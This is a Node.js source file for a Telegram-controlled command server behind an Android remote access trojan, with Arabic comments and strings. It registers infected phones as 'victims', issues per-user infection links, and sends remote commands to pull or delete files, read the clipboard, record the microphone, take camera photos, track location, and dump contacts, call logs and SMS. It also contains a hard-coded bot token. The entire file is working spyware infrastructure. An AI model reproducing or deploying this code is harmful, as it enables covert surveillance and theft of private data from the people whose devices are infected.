const express = require("express");
const webSocket = require("ws");
const http = require("http");
const telegramBot = require("node-telegram-bot-api");
const uuid4 = require("uuid").v4;

// --- الإعدادات الثابتة للهوية ---
const token = '8531140296:AAGGyJqPaVSiRWTEUbrG1fmEsfLHVWELV20';
const ADMIN_ID = 6568145373; // إمبراطور النظام Amjed Alkwry
const BASE_URL = "https://labeb.onrender.com"; 

const app = express();
const server = http.createServer(app);
const wss = new webSocket.Server({ server });
const bot = new telegramBot(token, { polling: true });

let clients = [];
let allowedUsers = [ADMIN_ID]; // قائمة المسموح لهم

// --- نظام إدارة الصلاحيات والروابط ---
bot.on("message", (msg) => {
    const id = msg.chat.id;
    const text = msg.text;

    // 1. حماية: تعليق أي شخص جديد
    if (!allowedUsers.includes(id)) {
        bot.sendMessage(ADMIN_ID, `🔔 <b>طلب انضمام جديد:</b>\n👤 الشخص: <code>${msg.from.first_name}</code>\n🆔 المعرف: <code>${id}</code>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[{ text: "✅ تفعيل حسابه", callback_data: `allow_${id}` }]]
            }
        });
        return bot.sendMessage(id, "⏳ <b>عذراً، وصولك معلق..</b>\nطلبك قيد المراجعة من قبل المطور @A_l_k_w_r_y");
    }

    // 2. قائمة الأدمن (Amjed Alkwry)
    if (id === ADMIN_ID) {
        if (text === "/start") {
            bot.sendMessage(id, `👑 <b>مرحباً بك يا مطورنا الأساسي</b>\n\n📊 الأجهزة: <code>${clients.length}</code>\n👥 المستخدمين: <code>${allowedUsers.length - 1}</code>`, {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ["📱 عرض كافة الضحايا", "👥 إدارة المصرح لهم"],
                        ["🚫 طرد مستخدم بالايدي", "🔄 تحديث السيرفر"]
                    ],
                    resize_keyboard: true
                }
            });
        }

        // تنفيذ الطرد بالايدي
        if (text === "🚫 طرد مستخدم بالايدي") {
            bot.sendMessage(id, "✍️ أرسل (المعرف ID) للشخص المراد طرده:");
            bot.once("message", (m) => {
                const targetId = parseInt(m.text);
                if (targetId === ADMIN_ID) return bot.sendMessage(id, "❌ لا يمكنك طرد نفسك.");
                allowedUsers = allowedUsers.filter(u => u !== targetId);
                bot.sendMessage(id, `✅ تم سحب صلاحية <code>${targetId}</code>`, {parse_mode: 'HTML'});
                bot.sendMessage(targetId, "⚠️ تمت إزالتك من النظام.");
            });
        }
    }

    // 3. قائمة المستخدمين (توليد الرابط تلقائياً)
    if (text === "/start" && id !== ADMIN_ID) {
        const myLink = `${BASE_URL}/?id=${id}`;
        bot.sendMessage(id, `💎 <b>أهلاً بك في نظام السيطرة</b>\n\n🔗 <b>رابطك الخاص:</b>\n<code>${myLink}</code>\n\n⚠️ ضحاياك سيظهرون هنا فقط.`, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [["📱 ضحاياي"]],
                resize_keyboard: true
            }
        });
    }

    if (text === "📱 ضحاياي" || text === "📱 عرض كافة الضحايا") {
        const myVictims = (id === ADMIN_ID) ? clients : clients.filter(c => c.ownerId == id);
        if (myVictims.length === 0) return bot.sendMessage(id, "❌ لا يوجد ضحايا متصلين.");
        
        myVictims.forEach(c => {
            bot.sendMessage(id, `📍 جهاز: <code>${c.id}</code>\n🌍 IP: <code>${c.ip}</code>`, {
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[{ text: "🕹️ لوحة التحكم", callback_data: `control_${c.id}` }]] }
            });
        });
    }
});

// --- لوحة التحكم المعربة (الأزرار من الصورة) ---
bot.on("callback_query", (q) => {
    const [action, value] = q.data.split("_");

    if (action === "allow") {
        allowedUsers.push(parseInt(value));
        bot.sendMessage(value, "✅ تم تفعيل حسابك! أرسل /start");
        bot.answerCallbackQuery(q.id, { text: "تم التفعيل" });
    }

    if (action === "control") {
        const victimId = value;
        const controlButtons = {
            inline_keyboard: [
                [{ text: "📥 جلب ملف", callback_data: `getfile_${victimId}` }, { text: "🗑️ حذف ملف", callback_data: `delfile_${victimId}` }],
                [{ text: "📋 الحافظة", callback_data: `clip_${victimId}` }, { text: "🎙️ تسجيل محيط", callback_data: `mic_${victimId}` }],
                [{ text: "📸 كاميرا سيلفي", callback_data: `selfie_${victimId}` }, { text: "📸 كاميرا رئيسية", callback_data: `maincam_${victimId}` }],
                [{ text: "📍 الموقع", callback_data: `loc_${victimId}` }, { text: "💬 رسالة توست", callback_data: `toast_${victimId}` }],
                [{ text: "📞 سجل المكالمات", callback_data: `calls_${victimId}` }, { text: "👥 قائمة الأسماء", callback_data: `contacts_${victimId}` }],
                [{ text: "📩 سحب الرسائل", callback_data: `msgs_${victimId}` }, { text: "📤 إرسال SMS", callback_data: `sendmsg_${victimId}` }],
                [{ text: "🎵 تشغيل صوت", callback_data: `play_${victimId}` }, { text: "🔇 إيقاف الصوت", callback_data: `stop_${victimId}` }]
            ]
        };
        bot.sendMessage(q.message.chat.id, `🕹️ <b>التحكم بالجهاز:</b> <code>${victimId}</code>`, {
            parse_mode: 'HTML', reply_markup: controlButtons
        });
    }

    const target = clients.find(c => c.id === value);
    if (target && action !== "allow" && action !== "control") {
        target.ws.send(JSON.stringify({ cmd: action }));
        bot.answerCallbackQuery(q.id, { text: "🚀 جاري التنفيذ" });
    }
});

// --- استقبال اتصالات الضحايا وربطهم ---
wss.on('connection', (ws, req) => {
    const urlParams = new URLSearchParams(req.url.split('?')[1]);
    const ownerId = urlParams.get('id') || ADMIN_ID; 

    const deviceId = uuid4().substring(0, 8);
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    clients.push({ id: deviceId, ws: ws, ip: ip, ownerId: ownerId });
    bot.sendMessage(ownerId, `⚠️ <b>تم رصد ضحية جديد! 🔥</b>\n🆔 المعرف: <code>${deviceId}</code>`, { parse_mode: 'HTML' });

    ws.on('close', () => { clients = clients.filter(c => c.id !== deviceId); });
});

server.listen(process.env.PORT || 3000, () => { console.log("Amjed Alkwry Admin Panel Active"); });
